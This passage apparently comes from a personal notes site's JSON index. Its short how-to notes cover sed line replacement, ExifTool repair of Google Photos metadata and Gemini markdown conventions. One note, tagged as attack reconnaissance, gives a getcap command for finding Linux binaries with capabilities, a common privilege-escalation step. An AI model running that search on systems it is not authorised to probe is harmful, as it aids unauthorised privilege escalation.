style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;START_LINE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;END_LINE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;If you want to &lt;a href=&quot;http://stackoverflow.com/a/11145362&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;replace a single line&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, you can use a similar trick (once you’ve identified the line number):&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sed&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -i&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;LINE_NUMBER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;s/.*/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;REPLACEMENT_TEXT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;It may be advisable to use single quote here, rather than double quotes + variable substitution, to prevent shell weirdness. Unfortunately, there’s really no way to tell when this command has finished (except to let it work through the whole file).&lt;/p&gt;"},"spells/Find-executables-with-SUID-capabilities":{"slug":"spells/Find-executables-with-SUID-capabilities","filePath":"spells/Find executables with SUID capabilities.md","title":"Find executables with SUID capabilities","links":[],"tags":["HowTo","Application/getcap","AttackCycle/Reconnaissance","OS/Linux/Permissions"],"content":"Executables can also have an SUID “capability” set in Linux, which is not the same as the SUID permission!\nThe getcap command displays a binary’s capabilities (if there are any), and can even be used to perform a search for such binaries using getcap -r $PATH 2&gt; /dev/null.","richContent":"&lt;p&gt;Executables can also have an SUID “capability” set in Linux, which is &lt;em&gt;not&lt;/em&gt; the same as the SUID permission!&lt;/p&gt;\n&lt;p&gt;The getcap command displays a binary’s capabilities (if there are any), and can even be used to perform a search for such binaries using &lt;code&gt;getcap -r $PATH 2&gt; /dev/null&lt;/code&gt;.&lt;/p&gt;"},"spells/Fix-EXIF-data-on-Google-Photos-exports":{"slug":"spells/Fix-EXIF-data-on-Google-Photos-exports","filePath":"spells/Fix EXIF data on Google Photos exports.md","title":"Fix EXIF data on Google Photos exports","links":[],"tags":["WebApplication/GooglePhotos","Application/ExifTool","HowTo","FileFormat/XMP","FileFormat/JSON"],"content":"Google Photos doesn’t save date/time changes, descriptions, or GPS data set in-app to the photos’ EXIF data. Instead, when using Google Takeout this information is exported as JSON sidecar files (apparently Google had to bikeshed something rather than just using XMP).\nFortunately, ExifTool can merge the data from these files back into the exported photographs:\nexiftool -r -d %s \\\n         -tagsfromfile &quot;%d/%F.json&quot; \\\n                       &quot;-GPSAltitude&lt;GeoDataAltitude&quot; \\\n                       &quot;-GPSLatitude&lt;GeoDataLatitude&quot; \\\n                       &quot;-GPSLatitudeRef&lt;GeoDataLatitude&quot; \\\n                       &quot;-GPSLongitude&lt;GeoDataLongitude&quot; \\\n                       &quot;-GPSLongitudeRef&lt;GeoDataLongitude&quot; \\\n                       &quot;-Keywords&lt;Tags&quot; \\\n                       &quot;-Subject&lt;Tags&quot; \\\n                       &quot;-Caption-Abstract&lt;Description&quot; \\\n                       &quot;-ImageDescription&lt;Description&quot; \\\n                       &quot;-DateTimeOriginal&lt;PhotoTakenTimeTimestamp&quot; \\\n         -ext &quot;*&quot; -overwrite_original -progress \\\n         --ext json $GOOGLE_PHOTOS_DIR\nNote that this will fail for any photos with a timestamp before 1970; for these photos, replace &quot;-DateTimeOriginal&lt;PhotoTakenTimeTimestamp&quot; with &quot;-DateTimeOriginal&lt;PhotoTakenTimeFormatted&quot; -d &quot;%b %d, %Y, %I:%M:%S %p UTC&quot;.","richContent":"&lt;p&gt;&lt;a href=&quot;https://legault.me/post/correctly-migrate-away-from-google-photos-to-icloud&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Google Photos doesn’t save date/time changes, descriptions, or GPS data set in-app to the photos’ EXIF data.&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; Instead, when using &lt;a href=&quot;https://takeout.google.com/settings/takeout&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Google Takeout&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; this information is exported as JSON sidecar files (apparently Google had to bikeshed something rather than just using &lt;a href=&quot;https://en.wikipedia.org/wiki/Extensible_Metadata_Platform&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;XMP&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;).&lt;/p&gt;\n&lt;p&gt;Fortunately, &lt;a href=&quot;https://exiftool.org/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;ExifTool&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; can merge the data from these files back into the exported photographs:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;exiftool&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -r&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; %s&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;         -tagsfromfile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;%d/%F.json&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;                       &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;-GPSAltitude&amp;#x3C;GeoDataAltitude&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;                       &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;-GPSLatitude&amp;#x3C;GeoDataLatitude&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;                       &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;-GPSLatitudeRef&amp;#x3C;GeoDataLatitude&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;                       &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;-GPSLongitude&amp;#x3C;GeoDataLongitude&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;                       &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;-GPSLongitudeRef&amp;#x3C;GeoDataLongitude&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;                       &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;-Keywords&amp;#x3C;Tags&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;                       &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;-Subject&amp;#x3C;Tags&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;                       &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;-Caption-Abstract&amp;#x3C;Description&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;                       &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;-ImageDescription&amp;#x3C;Description&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;                       &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;-DateTimeOriginal&amp;#x3C;PhotoTakenTimeTimestamp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;         -ext&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;*&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -overwrite_original&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -progress&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;         --ext&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; json&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $GOOGLE_PHOTOS_DIR&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Note that this will &lt;a href=&quot;https://exiftool.org/forum/index.php?topic=10636.0&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;fail for any photos with a timestamp before 1970&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;; for these photos, replace &lt;code&gt;&quot;-DateTimeOriginal&amp;#x3C;PhotoTakenTimeTimestamp&quot;&lt;/code&gt; with &lt;code&gt;&quot;-DateTimeOriginal&amp;#x3C;PhotoTakenTimeFormatted&quot; -d &quot;%b %d, %Y, %I:%M:%S %p UTC&quot;&lt;/code&gt;.&lt;/p&gt;"},"spells/Gemini-compatible-markdown":{"slug":"spells/Gemini-compatible-markdown","filePath":"spells/Gemini compatible markdown.md","title":"“Gemini compatible” markdown","links":[],"tags":["Protocol/Gemini","FileFormat/Gemtext","FileFormat/Markdown"],"content":"Gemini uses a syntax that is almost a subset of CommonMark.\nBe aware that Gemini treats all line breaks literally and clients are expected to wrap text. Line breaks are also rendered literally. So, one paragraph = one line!\nAllowed formatting elements\nThe trick with Gemini formatting is to remember that the protocol is line oriented, so all formatting (including linking) is applied to the entire block. Inline formatting isn’t supported, but can be used to the extent that raw markdown is easily readable.\nHeadings\nGemini allows H1 – H3 (# – ###) headings.\nUnlike HTML, Gemini specifically allows multiple H1 tags, as headings are treated purely as an outlining tool. This should probably be avoided in cases where a document might be rendered in both HTML and Gemini, as semantic HTML expects only a single H1 per content block.\nIn some cases, the first H1 tag in Gemini is treated as the page header (if it is not preceded by any other text with the exception of empty lines) and the following H2 is treated as a sub header (again, if there is no other intervening text except for blank lines).\nStrong/emphasis &amp; inline code\nGemini doesn’t explicitly support any formatting tags within a line. However, the convention of using single stars (*) to denote emphasis and back-ticks (`) to quote code is well established and can be used even in a “plain text” line without looking weird.\nInstead of using two stars (**) to denote bolded text, it’s probably better to use UPPER CASE for documents destined for Gemini.\nSince Markdown requires that these characters be escaped, so text destined for Gemini will need to be processed to remove back-slashed escapes (\\). Note that md2gmn can handle this automatically.\nThat said, when writing with Gemini in mind it’s probably best to take a minimalist approach to inline formatting. Use when required to clarify, but otherwise let your words speak for themselves!\nLists\nOnly unordered lists are permitted in Gemini, and no indentation is allowed. Lists must use star characters (*) as their leaders.\nQuotes\nQuote blocks cannot be nested in Gemini, and all interior formatting is preserved as-is. This means that in practice, quote blocks also can’t contain lists, code blocks, etc.\n“Code” blocks\nGemini allows code blocks. In Gemini the code block type (normally something like bash or html in Markdown) is used by clients as “alt text”. Unfortunately, many Markdown processors (including Jekyll) don’t handle arbitrary strings in the code block type gracefully, so we need to stick with Markdown’s conventions here.\nTables\nThe md2gmn utility handles tables by converting them into code blocks, which works for my purposes.\nLinks and images\nGemini doesn’t support Markdown links or images, though tools like md2gmn can handle the conversion into Gemini’s format.\n=&gt;[&lt;whitespace&gt;]&lt;URL&gt;[&lt;whitespace&gt;&lt;USER-FRIENDLY LINK NAME&gt;]\n\nI’ve yet to run into a Markdown-to-Gemini converter that handles inline links in a completely sensible way. That said, md2gmn does a good job if and only if links are presented as unordered lists or on singleton lines. Note that when using this convention, no non-link characters (except perhaps for the leading *  in unordered lists) may be used. This means that presenting links in unordered lists is probably the best option.\nAs an example, suppose we have the following markdown:\nThis is a sentence.\n \n- [necopinus.xyz](necopinus.xyz)\n- [Cardboard Iguana Security](cardboard-iguana.com)\n \nAn image follows.\n \n![[../02779186c69ce442260bd67d3bd11b3e.webp|This is some image alt-text]]\nThen md2gmn will output:\nThis is a sentence.\n \n=&gt; necopinus.xyz necopinus.xyz\n=&gt; cardboard-iguana.com Cardboard Iguana Security\n \nAn image follows.\n \n=&gt; ../02779186c69ce442260bd67d3bd11b3e.webp This is some image alt-text\nIncidentally, this gives good guidance as to how to write image alt-text — alt-text should be thought of as the linked text for the image.","richContent":"&lt;p&gt;&lt;a href=&quot;gemini://gemini.circumlunar.space/docs/specification.gmi&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Gemini&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; uses a syntax that is &lt;em&gt;almost&lt;/em&gt; a subset of &lt;a href=&quot;https://spec.commonmark.org/current/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;CommonMark&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;p&gt;Be aware that Gemini treats all line breaks literally and clients are expected to wrap text. Line breaks are also rendered literally. So, one paragraph = one line!&lt;/p&gt;\n&lt;h2 id=&quot;allowed-formatting-elements&quot;&gt;Allowed formatting elements&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#allowed-formatting-elements&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;The trick with Gemini formatting is to remember that the protocol is &lt;em&gt;line&lt;/em&gt; oriented, so all formatting (including linking) is applied to the entire block. Inline formatting isn’t supported, but can be used to the extent that raw markdown is easily readable.&lt;/p&gt;\n&lt;h3 id=&quot;headings&quot;&gt;Headings&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#headings&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Gemini allows H1 – H3 (&lt;code&gt;#&lt;/code&gt; – &lt;code&gt;###&lt;/code&gt;) headings.&lt;/p&gt;\n&lt;p&gt;Unlike HTML, Gemini &lt;em&gt;specifically allows&lt;/em&gt; multiple H1 tags, as headings are treated purely as an outlining tool. This should probably be avoided in cases where a document might be rendered in both HTML and Gemini, as semantic HTML expects only a single H1 per content block.&lt;/p&gt;\n&lt;p&gt;In some cases, the first H1 tag in Gemini is treated as the page header (if it is not preceded by any other text with the exception of empty lines) and the following H2 is treated as a sub header (again, if there is no other intervening text except for blank lines).&lt;/p&gt;\n&lt;h3 id=&quot;strongemphasis--inline-code&quot;&gt;Strong/emphasis &amp;#x26; inline code&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#strongemphasis--inline-code&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Gemini doesn’t explicitly support any formatting tags &lt;em&gt;within&lt;/em&gt; a line. However, the convention of using single stars (&lt;code&gt;*&lt;/code&gt;) to denote emphasis and back-ticks (`) to quote code is well established and can be used even in a “plain text” line without looking weird.&lt;/p&gt;\n&lt;p&gt;Instead of using two stars (&lt;code&gt;**&lt;/code&gt;) to denote bolded text, it’s probably better to use UPPER CASE for documents destined for Gemini.&lt;/p&gt;\n&lt;p&gt;Since Markdown requires that these characters be escaped, so text destined for Gemini will need to be processed to remove back-slashed escapes (&lt;code&gt;\\&lt;/code&gt;). Note that &lt;a href=&quot;https://github.com/tdemin/gmnhg&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;md2gmn&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; can handle this automatically.&lt;/p&gt;\n&lt;p&gt;That said, when writing with Gemini in mind it’s probably best to take a minimalist approach to inline formatting. Use when required to clarify, but otherwise let your words speak for themselves!&lt;/p&gt;\n&lt;h3 id=&quot;lists&quot;&gt;Lists&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#lists&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Only &lt;em&gt;unordered&lt;/em&gt; lists are permitted in Gemini, and no indentation is allowed. Lists 